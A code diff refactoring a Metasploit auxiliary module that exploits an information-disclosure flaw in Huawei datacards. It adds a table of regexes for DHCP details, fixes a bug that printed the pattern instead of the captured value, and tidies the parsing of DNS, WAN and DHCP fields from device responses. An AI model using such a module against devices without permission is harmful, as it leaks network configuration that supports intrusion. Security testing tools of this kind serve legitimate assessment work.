@@ -32,6 +32,13 @@ class Metasploit3 < Msf::Auxiliary
     'Secondary Dns'  => /<SecondaryDns>(.*)<\/SecondaryDns>/i
   }
 
+  DHCP_INFO ={
+    'LAN IP Address'      => /<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i,
+    'DHCP StartIPAddress' => /<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i,
+    'DHCP EndIPAddress'   => /<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i,
+    'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
+  }
+
   def initialize(info={})
     super(update_info(info,
       'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
@@ -185,7 +192,7 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Basic Information")
 
     BASIC_INFO.each do |k,v|
-      if res.body.match(v)
+      if resp_body.match(v)
         info = $1
         print_status("#{k}: #{info}")
       end
@@ -271,7 +278,7 @@ class Metasploit3 < Msf::Auxiliary
     WAN_INFO.each do |k,v|
       if resp_body.match(v)
         info = $1
-        print_status("#{k}: #{v}")
+        print_status("#{k}: #{info}")
       end
     end
   end
@@ -288,40 +295,25 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status('---===[ DHCP Details ]===---')
+    resp_body = res.body.to_s
 
-    # Grabbing the DhcpIPAddress
-    if res.body.match(/<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i)
-      dhcpipaddress = $1
-      print_status("LAN IP Address: #{dhcpipaddress}")
-    end
+    print_status('DHCP Details')
 
     # Grabbing the DhcpStatus
-    if res.body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
-      dhcpstatus = $1
-      print_status("DHCP: #{(dhcpstatus=="1") ? 'ENABLED' : 'DISABLED'}")
+    if resp_body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
+      dhcp_status = $1
+      print_status("DHCP: #{(dhcp_status == '1') ? 'ENABLED' : 'DISABLED'}")
     end
 
-    unless dhcpstatus == '1'
+    unless dhcp_status && dhcp_status == '1'
       return
     end
 
-    # Grabbing the DhcpStartIPAddress
-    if res.body.match(/<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i)
-      dhcpstartipaddress = $1
-      print_status("DHCP StartIPAddress: #{dhcpstartipaddress}")
-    end
-
-    # Grabbing the DhcpEndIPAddress
-    if res.body.match(/<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i)
-      dhcpendipaddress = $1
-      print_status("DHCP EndIPAddress: #{dhcpendipaddress}")
-    end
-
-    # Grabbing the DhcpLeaseTime
-    if res.body.match(/<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i)
-      dhcpleasetime = $1
-      print_status("DHCP Lease Time: #{dhcpleasetime}")
+    DHCP_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+      end
     end
   end
 
